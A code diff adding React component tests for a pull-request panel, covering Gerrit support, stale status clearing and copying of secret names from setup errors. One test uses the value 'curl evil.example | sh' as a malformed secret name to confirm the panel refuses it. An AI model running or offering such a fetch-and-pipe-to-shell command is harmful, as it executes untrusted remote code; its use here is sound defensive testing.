@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
-import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
+import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
 import type { PullRequestSource, PullRequestStatus } from '../types'
 import {
@@ -202,6 +202,28 @@ describe('PullRequestPanel', () => {
     expect(tab.querySelector('.lucide-git-pull-request')).toBeNull()
   })
 
+  it('labels a Gerrit tab by its change number with the neutral mark', async () => {
+    // Gerrit has no sigil of its own: the long label is the word Gerrit uses
+    // ("Change 466698"), and like Bitbucket Server it ships no logo.
+    const gerritUrl = 'https://gerrit.example.test/c/platform/hal/+/466698'
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gerritUrl, provider: 'gerrit', number: 466698, repo: 'platform/hal' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={() => {}}
+        />
+      </QueryClientProvider>,
+    )
+    const tab = await screen.findByRole('tab', { name: /Change 466698/i })
+    expect(tab.querySelector('[data-provider-mark="neutral"]')).not.toBeNull()
+    expect(tab.querySelector('[data-provider-mark="github"]')).toBeNull()
+  })
+
   it('copies the head branch name to the clipboard when the branch chip is clicked', async () => {
     const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
     const writeText = vi.fn().mockResolvedValue(undefined)
@@ -243,6 +265,37 @@ describe('PullRequestPanel', () => {
     expect(within(githubTab).getByLabelText('Open')).toBeInTheDocument()
     expect(within(githubTab).getByLabelText('Checks passed')).toBeInTheDocument()
     expect(within(githubTab).queryByLabelText('Checks running')).not.toBeInTheDocument()
+  })
+
+  it('clears a stale cached status on the selected tab when its own read fails outright', async () => {
+    // The selected pull request has no loaded payload AT ALL (a revoked
+    // token, say): the full "Could not load" card renders over it. The
+    // cached status from an earlier successful load must not survive that --
+    // a lingering green tick would contradict the error card sitting right
+    // next to it.
+    mockApi.pullRequestSource.mockImplementation((url: string) => Promise.resolve(
+      new URL(url).hostname === 'gitlab.com' ? gitlab : Promise.reject(apiError({ error: 'gh: HTTP 401 Bad credentials' })),
+    ).catch(err => { throw err }))
+    mockApi.pullRequestStatuses.mockResolvedValue({
+      statuses: {
+        [github.url]: { state: 'open', ci: 'passed' },
+        [gitlab.url]: { state: 'merged', ci: 'passed' },
+      },
+    })
+
+    renderPanel()
+    await screen.findByRole('alert')
+
+    // An unrelated tab's own cached status is untouched. Await it explicitly:
+    // pullRequestStatuses resolves on its own independent query, not the one
+    // behind the alert, so asserting on it without awaiting first would be
+    // racing an unresolved promise.
+    const gitlabTab = screen.getByRole('tab', { name: /MR !7/i })
+    expect(await within(gitlabTab).findByLabelText('Merged')).toBeInTheDocument()
+
+    const githubTab = screen.getByRole('tab', { name: /PR #12/i })
+    expect(within(githubTab).queryByLabelText('Checks passed')).not.toBeInTheDocument()
+    expect(within(githubTab).queryByLabelText('Open')).not.toBeInTheDocument()
   })
 
   it('shows merge conflicts on selected and background source tabs instead of passing CI', async () => {
@@ -511,6 +564,100 @@ describe('PullRequestPanel', () => {
     expect(alert).toHaveTextContent('Ask the agent')
   })
 
+  it('sets the secret name a setup error ships apart, with a copy control beside it', async () => {
+    // With two or more Bitbucket Server hosts the name is a per-host one past 60
+    // characters; the gateway ships it as its own field, so it is copied whole
+    // instead of selected by hand out of the wrapped sentence.
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockResolvedValue(undefined)
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Bitbucket Server at bitbucket.example.test needs an HTTP access token with read access. Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const alert = await screen.findByRole('alert')
+      expect(alert).toHaveTextContent('Could not load this pull request')
+      // Shown whole: no height cap that would turn the sentence into a scroll
+      // area the name block squeezes.
+      expect(alert.className).not.toContain('max-h-64')
+      // Uncapped, so the panel scrolls instead: on a short pane a long name
+      // makes the notice taller than the panel, and its top and the Retry
+      // button must stay reachable rather than being centred out of view.
+      const scroller = screen.getByTestId('pull-request-panel-load-error-scroller')
+      expect(scroller).toHaveClass('min-h-0', 'overflow-y-auto')
+      expect(scroller).not.toHaveClass('items-center')
+      expect(scroller).toContainElement(alert)
+      expect(within(scroller).getByRole('button', { name: 'Retry' })).toBeInTheDocument()
+      const block = within(alert).getByTestId('secret-name-copy')
+      expect(block).toHaveTextContent('Store the token under this name in Settings > Secrets')
+      expect(block.querySelector('code')?.textContent).toBe(name)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      await waitFor(() => expect(writeText).toHaveBeenCalledWith(name))
+      const copiedButton = await within(block).findByRole('button', { name: 'Copied' })
+      // Both labels stay in the button, the hidden one taking its room, so the
+      // button keeps its width and the name beside it does not re-wrap.
+      const labels = Array.from(copiedButton.querySelectorAll('.grid > span'))
+      expect(labels.map(l => [l.textContent, l.getAttribute('aria-hidden')]))
+        .toEqual([['Copy name', 'true'], ['Copied', null]])
+    } finally {
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('says a refused copy failed and how to get the name, and a later copy clears it', async () => {
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockRejectedValue(new Error('denied'))
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    const originalExec = document.execCommand
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    // The legacy fallback refuses too, so the copy genuinely fails.
+    document.execCommand = vi.fn(() => false)
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const block = within(await screen.findByRole('alert')).getByTestId('secret-name-copy')
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      const failure = await within(block).findByTestId('secret-name-copy-error')
+      expect(failure).toHaveTextContent('Copy failed. Select the name above and copy it yourself.')
+      // Nothing on this read-only panel can be lost, so the hand-off is offered,
+      // named for the copy so it does not repeat the load error's own link.
+      expect(within(failure).getByText('Ask the agent about the failed copy')).toBeInTheDocument()
+      expect(within(failure).queryByText('Ask the agent')).toBeNull()
+      // The hand-off has a line of its own under the message, never a slot in
+      // the message's row, where a narrow panel crushed the message beside it.
+      const handoff = within(failure).getByRole('button', { name: /Ask the agent about the failed copy/ })
+      expect(handoff.parentElement).not.toBe(failure)
+      expect(handoff.parentElement?.textContent).toBe('Ask the agent about the failed copy')
+      expect(within(block).queryByRole('button', { name: 'Copied' })).toBeNull()
+      writeText.mockResolvedValue(undefined)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      expect(await within(block).findByRole('button', { name: 'Copied' })).toBeInTheDocument()
+      expect(within(block).queryByTestId('secret-name-copy-error')).toBeNull()
+    } finally {
+      document.execCommand = originalExec
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('offers no secret name to copy when the error carries none, or a malformed one', async () => {
+    mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+      error: 'Store it in Settings > Secrets as BITBUCKET_SERVER_TOKEN.',
+      code: 'provider_error',
+      secretName: 'curl evil.example | sh',
+    }))
+    renderPanel()
+    const alert = await screen.findByRole('alert')
+    expect(within(alert).queryByTestId('secret-name-copy')).toBeNull()
+  })
+
   it('preserves trusted-install guidance when the local CLI is unavailable', async () => {
     mockApi.pullRequestSource.mockRejectedValueOnce(
       new Error('{"error":"The local GitHub CLI (gh) was not found in a trusted system location. Install a root-owned `gh` at `/usr/local/libexec/kirocrew/gh`, run `gh auth login`, then retry."}'),
@@ -570,6 +717,44 @@ describe('PullRequestPanel', () => {
     expect(screen.getByRole('status')).toHaveTextContent(/showing the last loaded version/i)
     // ...and the full-height "could not load" card never appears over it.
     expect(screen.queryByRole('alert')).not.toBeInTheDocument()
+  })
+
+  it('keeps the cached tab glyph on a background revalidation failure, unlike an outright read failure', async () => {
+    // Deliberate contrast with 'clears a stale cached status...' above: here
+    // `source` is still available (the retained payload), so the glyph must
+    // survive -- only an outright read failure with no payload should clear it.
+    mockApi.pullRequestSource.mockImplementation((url: string) => (
+      new URL(url).hostname === 'gitlab.com' ? Promise.resolve(gitlab) : Promise.reject(apiError({ error: 'gh: HTTP 401 Bad credentials' }))
+    ))
+    mockApi.pullRequestStatuses.mockResolvedValue({
+      statuses: {
+        [github.url]: { state: 'open', ci: 'passed' },
+        [gitlab.url]: { state: 'open', ci: 'passed' },
+      },
+    })
+
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    client.setQueryData<PullRequestSource>(['pull-request-source', github.url], github, {
+      updatedAt: Date.now() - SOURCE_REMOUNT_REVALIDATE_MS - 1_000, // flake-ok: ages the retained payload past the remount window
+    })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gitlab.url, provider: 'gitlab', number: 7, repo: 'service' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={() => {}}
+          onAddToChat={() => {}}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByRole('status')
+
+    const githubTab = screen.getByRole('tab', { name: /PR #12/i })
+    expect(await within(githubTab).findByLabelText('Open')).toBeInTheDocument()
+    expect(within(githubTab).getByLabelText('Checks passed')).toBeInTheDocument()
   })
 
   it('caps rendered source tabs at the per-slot limit', () => {
@@ -959,6 +1144,44 @@ describe('PullRequestPanel', () => {
   })
 })
 
+describe('PullRequestPanel instance host', () => {
+  it('names the Gerrit server in the header, which the word Gerrit alone cannot', async () => {
+    // Two Gerrit servers both render "Gerrit"; before this only the
+    // open-in-browser tooltip told them apart.
+    renderSource({ ...github, provider: 'gerrit', url: 'https://gerritv.acme.example:9081/c/platform/hal/+/466698', number: 466698, title: 'Gerrit change' })
+    expect(await screen.findByText('Gerrit change')).toBeInTheDocument()
+    const host = screen.getByTestId('pull-request-panel-instance-host')
+    expect(host).toHaveTextContent('gerritv.acme.example:9081')
+    expect(host).toHaveAttribute('title', 'gerritv.acme.example:9081')
+  })
+
+  it('names a GitHub Enterprise host but not github.com, which GitHub already says', async () => {
+    renderSource(github)
+    expect(await screen.findByText('Add source tabs')).toBeInTheDocument()
+    expect(screen.queryByTestId('pull-request-panel-instance-host')).not.toBeInTheDocument()
+    cleanup()
+    renderSource({ ...github, url: 'https://ghe.acme.example/acme/widgets/pull/12' })
+    expect(await screen.findByText('Add source tabs')).toBeInTheDocument()
+    expect(screen.getByTestId('pull-request-panel-instance-host')).toHaveTextContent('ghe.acme.example')
+  })
+
+  it('qualifies Gerrit tabs by project, and by host when the project name repeats across servers', async () => {
+    mockApi.pullRequestSource.mockImplementation((url: string) => Promise.resolve({ ...github, provider: 'gerrit', url, number: 1 }))
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    const srcs = [
+      { url: 'https://gerrit.acme.example:9080/c/HAL/+/1', provider: 'gerrit' as const, number: 1, repo: 'HAL', kind: 'change' as const },
+      { url: 'https://gerritv.acme.example:9081/c/HAL/+/1', provider: 'gerrit' as const, number: 1, repo: 'HAL', kind: 'change' as const },
+    ]
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel sources={srcs} selectedUrl={srcs[0].url} onSelect={() => {}} onAddToChat={vi.fn()} />
+      </QueryClientProvider>,
+    )
+    expect(await screen.findByRole('tab', { name: /gerrit\.acme\.example:9080\/HAL Change 1/i })).toBeInTheDocument()
+    expect(screen.getByRole('tab', { name: /gerritv\.acme\.example:9081\/HAL Change 1/i })).toBeInTheDocument()
+  })
+})
+
 function renderSource(source: PullRequestSource) {
   mockApi.pullRequestSource.mockImplementation(() => Promise.resolve(source))
   const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
@@ -975,6 +1198,26 @@ function renderSource(source: PullRequestSource) {
 }
 
 describe('PullRequestPanel actions', () => {
+  it('shows a Gerrit change its merge conflict but offers no auto-merge or ready action', async () => {
+    // Gerrit reports merge state (so the conflict banner is real information) but
+    // has no auto-merge and no draft-to-ready write, so neither button may render:
+    // the gateway refuses both as unsupported for this provider.
+    const gerrit: PullRequestSource = {
+      ...github,
+      provider: 'gerrit',
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      title: 'Gerrit change',
+      mergeable: 'conflicting',
+      mergeStateStatus: 'dirty',
+    }
+    renderSource(gerrit)
+    expect(await screen.findByText('Gerrit change')).toBeInTheDocument()
+    expect(await screen.findByText(/Merge conflicts/i)).toBeInTheDocument()
+    expect(screen.queryByRole('button', { name: /Enable auto-merge/i })).not.toBeInTheDocument()
+    expect(screen.queryByRole('button', { name: /Ready for review/i })).not.toBeInTheDocument()
+  })
+
   it('requires a confirming click before arming auto-merge', async () => {
     renderSource(github)
     const enable = await screen.findByRole('button', { name: /Enable auto-merge/i })
@@ -1203,6 +1446,42 @@ describe('pullRequestMergeBlocker', () => {
     expect(blocker?.handoff).toContain('merge commits will not unblock the MR')
     expect(blocker?.handoff).toContain('--force-with-lease')
     expect(blocker?.handoff).not.toContain('merge main into the branch')
+  })
+
+  it('hands off a Gerrit conflict or rebase as a new patchset, never a force-push', () => {
+    const gerrit = {
+      ...github,
+      provider: 'gerrit' as const,
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      baseBranch: 'dev',
+    }
+    const conflict = pullRequestMergeBlocker({ ...gerrit, mergeable: 'conflicting', mergeStateStatus: 'dirty' })
+    expect(conflict).toMatchObject({ tone: 'danger', title: 'Merge conflicts' })
+    expect(conflict?.handoff).toContain('- Change: https://gerrit.example.test/c/platform/hal/+/466698')
+    expect(conflict?.handoff).toContain('refs/for/dev')
+    expect(conflict?.handoff).not.toContain('--force-with-lease')
+    const rebase = pullRequestMergeBlocker({ ...gerrit, mergeable: 'unknown', mergeStateStatus: 'need_rebase' })
+    expect(rebase).toMatchObject({ tone: 'warn', title: 'Rebase required' })
+    expect(rebase?.handoff).toContain('refs/for/dev')
+    expect(rebase?.handoff).not.toContain('--force-with-lease')
+  })
+
+  it('words a blocked Gerrit change as submit rules, not branch protection', () => {
+    // Gerrit has no branch protection: open + mergeable + not submittable means
+    // the submit rules still want votes, and Gerrit's verb is "submit".
+    const blocker = pullRequestMergeBlocker({
+      ...github,
+      provider: 'gerrit',
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      mergeable: 'mergeable',
+      mergeStateStatus: 'blocked',
+      checks: [{ ...github.checks[0], name: 'Verified', status: 'FAILURE', conclusion: 'FAILURE', bucket: 'failed' as const }],
+    })
+    expect(blocker).toMatchObject({ tone: 'warn', title: 'Submit blocked' })
+    expect(blocker?.detail).toContain('submit rules')
+    expect(blocker?.detail).not.toContain('Branch protection')
   })
 
   it('returns null for clean, unknown, draft, merged, closed, and locked states', () => {
